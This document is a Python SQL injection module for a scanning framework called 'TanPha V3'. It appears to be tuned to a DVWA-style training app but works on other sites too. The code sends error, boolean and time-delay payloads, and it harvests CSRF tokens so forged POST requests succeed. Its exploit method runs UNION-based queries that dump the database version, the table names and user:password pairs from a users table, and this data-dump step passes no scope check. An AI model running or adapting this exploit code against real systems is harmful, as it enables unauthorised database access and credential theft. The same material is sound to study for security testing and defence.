"""SQL Injection Module for TanPha V3 (Global Low, Medium, High + CSRF Aware)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.experiment import (
    ExperimentContext, BaselineCollector, BaselineComparator,
    MutationAttempt, Outcome, ResponseFingerprint
)
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re


class SQLInjectionModule(BaseModule):
    name = "SQLInjection"
    module_id = "sql_injection"
    version = "5.0 (Global CSRF-Aware)"
    vulnerability_class = "SQL_INJECTION"
    default_impact = "DATABASE_ACCESS"
    default_privilege = "LIMITED"

    _ERROR_SIGNATURES = [
        "sql syntax", "you have an error in your sql", "unclosed quotation mark",
        "warning: mysql_", "pg_query()", "ora-00933", "sqlstate[",
        "different number of columns", "unknown column"
    ]

    def can_run(self, context: TargetContext) -> bool:
        return len(context.discovery.parameters) > 0

    def _has_sql_error(self, response) -> bool:
        if not response: return False
        text = (response.text or "").lower()
        return any(sig in text for sig in self._ERROR_SIGNATURES)

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _extract_csrf(self, html):
        """Global CSRF Extractor: Nyari input yang namanya mengandung token/csrf."""
        if not html: return None, None
        # Cari name yang ada token/csrf-nya, ambil value-nya
        pattern = r'name=["\']([^"\']*(?:token|csrf)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']'
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1), match.group(2)
        return None, None

    def _get_submit_field(self, context):
        for p in context.discovery.parameters:
            if any(k in p.lower() for k in ["submit", "login", "go", "send", "btn", "save", "upload", "search"]):
                return p
        return "Submit"

    def _send_payload(self, context, param, payload, scope_checker=None, timeout=10):
        if "?" in context.target.base_url:
            # GET MODE
            target_url = self._build_target_url(context.target.base_url, param, payload)
            return context.http_client.request(
                "GET", target_url, target_param=param,
                scope_checker=scope_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            # POST MODE (FIX: Fetch halaman dulu buat ambil CSRF Token)
            get_res = context.http_client.request("GET", context.target.base_url, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
            csrf_name, csrf_value = None, None
            if get_res.success and get_res.response:
                csrf_name, csrf_value = self._extract_csrf(get_res.response.text)

            submit_field = self._get_submit_field(context)
            data = {param: payload, submit_field: submit_field}
            
            # Inject CSRF Token kalau ada
            if csrf_name and csrf_value:
                data[csrf_name] = csrf_value

            return context.http_client.request(
                "POST", context.target.base_url, data=data,
                scope_checker=scope_checker, bypass_mutation=True, timeout=timeout
            )

    def _test_time_based(self, context, param, scope_checker=None):
        print(f"      [>] Time-Based test on '{param}'...")
        baseline_res = self._send_payload(context, param, "1", scope_checker)
        baseline_avg = baseline_res.elapsed if baseline_res.success else 1.0
        threshold = baseline_avg + 4.0

        time_payloads = [
            {"dbms": "MySQL", "payload": "1 AND SLEEP(5)#"},
            {"dbms": "MySQL", "payload": "1' AND SLEEP(5)#"},
            {"dbms": "PostgreSQL", "payload": "1; SELECT pg_sleep(5)#"},
        ]

        for item in time_payloads:
            res1 = self._send_payload(context, param, item["payload"], scope_checker, timeout=15)
            if res1.success and res1.elapsed >= threshold:
                res2 = self._send_payload(context, param, item["payload"], scope_checker, timeout=15)
                if res2.success and res2.elapsed >= threshold:
                    print(f"          [+] VERIFIED! {item['dbms']} delay: {res2.elapsed:.2f}s")
                    return [Evidence(
                        attempt_id="time_001", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="DELAYED_RESPONSE",
                        reason_code="TIME_DELAY", reason_detail=f"{item['dbms']} SLEEP",
                        confidence=0.9, evidence_text="Time-based delay", assess_payload=item["payload"]
                    )]
        return []

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        evidence_pool = []
        payloads = [
            {"p": "1' AND 1=1#", "desc": "String Comment"},
            {"p": "1 AND 1=1#", "desc": "Numeric Comment"},
            {"p": "'", "desc": "String Break"},
            {"p": "1 AND 1=1", "desc": "Numeric Boolean"},
        ]

        for param in context.discovery.parameters:
            if "?" in context.target.base_url:
                exp_ctx = ExperimentContext(method="GET", base_url=context.target.base_url, parameter=param)
                collector = BaselineCollector(context.http_client)
                exp_ctx = collector.collect(exp_ctx, samples=3, scope_checker=scope_checker, target_param=param)
            else:
                # POST mode baseline (pake _send_payload yang udah CSRF-aware)
                baseline_res = self._send_payload(context, param, "1", scope_checker)
                if not baseline_res.success: continue
                exp_ctx = ExperimentContext(method="POST", base_url=context.target.base_url, parameter=param)
                exp_ctx.baseline_fingerprint = ResponseFingerprint.from_response(baseline_res.response)
                exp_ctx.is_baseline_stable = True
                print(f"      [+] Baseline POST for '{param}' taken.")

            if not exp_ctx.is_baseline_stable:
                continue

            comparator = BaselineComparator(exp_ctx)
            for item in payloads:
                attempt = MutationAttempt(strategy=item["desc"], parameter=param, method="GET")
                result = self._send_payload(context, param, item["p"], scope_checker)
                attempt.elapsed = result.elapsed

                if result.success and result.response:
                    attempt.outcome, attempt.reason_code, attempt.reason_detail = comparator.classify(result.response)
                    print(f"          [{attempt.id}] Payload: {item['p']} | Outcome: {attempt.outcome.value}")

                    if attempt.outcome == Outcome.CHANGED_RESPONSE:
                        confidence = 0.5
                        ev_text = f"Response changed ({attempt.reason_detail})"
                        if self._has_sql_error(result.response):
                            confidence = 0.8
                            ev_text += " | Error signature."
                        ev = Evidence(
                            attempt_id=attempt.id, module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=param, outcome=attempt.outcome.value,
                            reason_code=attempt.reason_code.value, reason_detail=attempt.reason_detail,
                            confidence=confidence, evidence_text=ev_text, assess_payload=item["p"],
                            baseline_reference=exp_ctx.baseline_fingerprint.normalized_exact_hash
                        )
                        evidence_pool.append(ev)
                        break

            if not evidence_pool:
                time_evs = self._test_time_based(context, param, scope_checker)
                evidence_pool.extend(time_evs)
        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying '{evidence.parameter}'...")

        if evidence.reason_code == "TIME_DELAY":
            res = self._send_payload(context, evidence.parameter, evidence.assess_payload, scope_checker, timeout=15)
            if res.success and res.elapsed >= 4.5:
                return VerificationResult(VerificationStatus.VALIDATED, 0.95, "TIME_DELAY_CONFIRMED", f"Delay {res.elapsed:.2f}s", verify_payload=evidence.assess_payload)
            return VerificationResult(VerificationStatus.REJECTED, 0.0, "TIME_DELAY_FAILED", "No delay")

        payload_true = "1' AND 1=1#"
        payload_false = "1' AND 1=2#"
        res_true = self._send_payload(context, evidence.parameter, payload_true, scope_checker)
        res_false = self._send_payload(context, evidence.parameter, payload_false, scope_checker)

        if res_true.success and res_false.success and res_true.response and res_false.response:
            len_diff = abs(len(res_true.response.text) - len(res_false.response.text))
            if len_diff > 20 and res_true.response.text != res_false.response.text:
                return VerificationResult(VerificationStatus.VALIDATED, 0.9, "STRING_BOOLEAN_CONFIRMED", f"String True/False diff: {len_diff}", verify_payload=payload_false)

        print("      [*] String failed. Trying Numeric fallback...")
        num_true = "1 AND 1=1#"
        num_false = "1 AND 1=2#"
        res_num_true = self._send_payload(context, evidence.parameter, num_true, scope_checker)
        res_num_false = self._send_payload(context, evidence.parameter, num_false, scope_checker)

        if res_num_true.success and res_num_false.success and res_num_true.response and res_num_false.response:
            num_len_diff = abs(len(res_num_true.response.text) - len(res_num_false.response.text))
            if num_len_diff > 20 and res_num_true.response.text != res_num_false.response.text:
                return VerificationResult(VerificationStatus.VALIDATED, 0.9, "NUMERIC_BOOLEAN_CONFIRMED", f"Numeric True/False diff: {num_len_diff}", verify_payload=num_false)

        return VerificationResult(VerificationStatus.REJECTED, 0.0, "ALL_LAYERS_FAILED", "No verification layer succeeded")

    def _find_column_count(self, context, param, scope_checker=None, is_string_mode=True):
        print(f"      [>] Detecting column count for '{param}' (UNION method)...")
        for i in range(1, 6):
            cols = [str(x) for x in range(1, i + 1)]
            
            if is_string_mode:
                payload = f"-1' UNION SELECT {', '.join(cols)}#"
            else:
                payload = f"-1 UNION SELECT {', '.join(cols)}#"
                
            res = self._send_payload(context, param, payload, scope_checker)
            
            if res.success and not self._has_sql_error(res.response):
                print(f"          [+] Column count detected: {i} ({'string' if is_string_mode else 'numeric'} mode)")
                return i
                
        print("          [-] Could not determine column count. Falling back to 2.")
        return 2

    def _build_union_payload(self, expr, col_count, is_string=True):
        cols = [expr] + ["null"] * (col_count - 1)
        prefix = "-1' " if is_string else "-1 "
        safe_cols = []
        for c in cols:
            if "SELECT" in c.upper() and not c.startswith("("):
                safe_cols.append(f"({c})")
            else:
                safe_cols.append(c)
        return f"{prefix}UNION SELECT {', '.join(safe_cols)}#"

    def _extract_text(self, html: str) -> str:
        if not html: return ""
        html = re.sub(r'<script\b.*?</script>', ' ', html, flags=re.DOTALL | re.I)
        html = re.sub(r'<style\b.*?</style>', ' ', html, flags=re.DOTALL | re.I)
        text = re.sub(r'<[^>]+>', '|', html)
        text = re.sub(r'\|+', '|', text)
        text = re.sub(r'\s+', ' ', text).strip()
        return text

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n" + "=" * 55)
        print(" [***] SQLI DATA DUMP (Global CSRF-Aware) [***] ")
        print("=" * 55)
        print(f"[*] Target: {finding.location} | Parameter: '{finding.parameter}'")

        is_string_mode = "'" in finding.verify_payload
        print(f"[*] Mode: {'String (Low/High)' if is_string_mode else 'Numeric (Medium)'}")

        col_count = self._find_column_count(context, finding.parameter, is_string_mode=is_string_mode)

        dump_payloads = [
            {"name": "DBMS Version", "expr": "@@version"},
            {"name": "Current Database", "expr": "database()"},
            {"name": "Current User", "expr": "user()"},
            {"name": "Tables List", "expr": "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"},
            {"name": "Users", "expr": "(SELECT GROUP_CONCAT(user, 0x3a, password SEPARATOR 0x0a) FROM users)"}
        ]

        for item in dump_payloads:
            print(f"\n[>] Dumping {item['name']}...")
            payload = self._build_union_payload(item["expr"], col_count, is_string_mode)
            res = self._send_payload(context, finding.parameter, payload, None, timeout=10)
            
            if not (res and res.success and res.response):
                print("    [-] Failed.")
                continue
            
            text = self._extract_text(res.response.text)
            
            if "First name:" in text:
                start = text.find("First name:")
                end = text.find("More Information", start) if "More Information" in text else start + 500
                snippet = text[start:end].strip()
                print(f"    [+] {snippet[:400]}")
            else:
                print(f"    [+] {text[:400]}")

        print("\n" + "=" * 55)
        print(" Data dump finished.")
        print("=" * 55 + "\n")
